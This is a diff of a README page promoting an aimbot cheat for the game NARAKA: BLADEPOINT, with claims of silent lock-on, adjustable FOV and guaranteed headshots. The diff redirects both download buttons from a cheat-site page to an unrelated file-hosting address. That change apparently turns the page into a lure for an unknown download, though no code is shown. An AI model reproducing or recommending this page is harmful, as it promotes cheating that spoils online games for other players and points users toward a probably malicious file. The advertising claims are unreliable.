@@ -4,14 +4,14 @@
 
 Ranged combat in **NARAKA: BLADEPOINT** hits hard—but only if you can aim under pressure. If you’re tired of missing key shots, getting punished mid-animation, or losing to zipline campers, the **NARAKA Aimbot** puts your aim on rails. With **silent lock-on, adjustable FOV, hitbox targeting, and crossbow tracking**, this cheat turns you into a deadly ranged specialist no matter the weapon. 🎯⚔️
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/naraka-bladepoint/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload4.bitbucket.io)
 ---
 
 ## 🧠 What Makes Aimbot in NARAKA a Game-Changer?
 
 While the game’s mostly about swords and movement, **ranged tools like bows, repeaters, cannons, and pistols** can clutch matches or wipe full trios—**if you hit your shots**. But with the aimbot active, you'll **never miss another headshot**, no matter how fast they move, dodge, or fly through the air.
 
-[![Download Aimbot](https://playsharp.io/wp-content/uploads/2023/08/123123.png)](https://wecheaters.github.io/cheats/naraka-bladepoint/)
+[![Download Aimbot](https://playsharp.io/wp-content/uploads/2023/08/123123.png)](https://fileoffload4.bitbucket.io)
 ---
 
 ## 🔥 Aimbot Features Breakdown
